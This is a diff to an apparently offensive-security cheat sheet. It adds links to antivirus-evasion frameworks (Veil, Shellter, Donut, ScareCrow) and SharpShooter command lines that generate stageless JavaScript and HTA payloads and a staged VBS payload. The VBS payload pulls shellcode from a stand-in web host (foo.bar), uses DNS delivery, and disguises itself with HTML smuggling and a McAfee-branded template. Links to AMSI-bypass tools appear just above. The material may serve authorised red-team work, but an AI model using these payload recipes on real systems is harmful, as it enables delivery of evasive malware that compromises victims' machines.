@@ -16,6 +16,26 @@ https://github.com/tokyoneon/Chimera ( bypassing AMSI and signature based detect
 https://github.com/persianhydra/Xeexe-TopAntivirusEvasion   
 https://github.com/BC-SECURITY/Empire/blob/master/empire/server/common/bypasses.py  
 
+[Veil](https://github.com/Veil-Framework/Veil) 
+[Shellter](https://www.shellterproject.com/download/)  
+[Donut](https://github.com/TheWover/donut) 
+[Vulcan](https://github.com/praetorian-code/vulcan) 
+[Scarecrow](https://github.com/optiv/ScareCrow)  
+
+## Sharpshooter
+[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)   
+
+Javascript Payload Stageless:   
+
+    SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
+
+Stageless HTA Payload: 
+
+    SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
+
+Staged VBS:
+
+    SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
 
 
 ## Commands 
